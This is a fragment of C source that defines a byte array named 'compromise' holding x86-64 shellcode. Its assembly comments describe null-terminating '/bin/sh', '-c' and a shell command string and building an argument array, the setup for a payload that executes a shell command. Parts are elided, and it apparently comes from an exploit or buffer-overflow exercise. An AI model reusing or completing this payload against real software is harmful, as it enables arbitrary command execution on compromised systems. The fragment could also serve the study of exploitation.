...
char compromise[159] = {
    ...
    0x88, 0x46, 0x07,                            //mov [rsi+flagStr-exeStr-2],al      ; move null byte to the end of /bin/sh
    0x88, 0x46, 0x0B,                            //mov [rsi+cmdStr-exeStr-1],al       ; move null byte to the end of -c
    0x88, 0x46, 0x19,                            //mov [rsi+arrayAddr-exeStr-1],al    ; move null byte to the end of shell command
    0x48, 0x89, 0x46, 0x32,                          //mov [rsi+arrayAddr-exeStr+24],rax  ; move null word to the end of array
    ...
    0xBE, 0xFF, 0xE6, 0xFB, 0xF7,                        //mov rsi, 0xf7fbe6ff ; should be ecx
    0x30, 0xC9,                              //xor cl, cl
